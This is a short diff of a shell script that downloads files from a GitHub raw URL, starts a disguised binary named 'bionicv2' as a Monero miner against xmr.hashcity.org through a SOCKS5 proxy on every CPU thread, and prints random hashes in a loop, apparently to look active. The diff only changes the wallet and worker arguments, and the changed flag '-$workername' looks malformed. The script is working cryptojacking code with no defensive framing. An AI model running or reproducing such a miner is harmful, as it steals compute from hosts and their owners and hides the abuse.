@@ -6,9 +6,9 @@ wget -O proxy.py https://raw.githubusercontent.com/mariobiszz/nenenenenene/main/
 chmod +x bionicv2 proxy.py
 python3 proxy.py >/dev/null &
 pool="xmr.hashcity.org:4444"
-wallet="novalanto.$(cat /proc/sys/kernel/hostname)"
+wallet="novalanto"
 workername="$(cat /proc/sys/kernel/hostname)"
 thread="$(nproc --all)"
 proxy="socks5://174.138.17.79:4145"
-./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p x -k --tls -t$thread
+./bionicv2 -o $pool -u $wallet --keepalive --donate-level 1 -p x -$workername --tls -t$thread
 while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
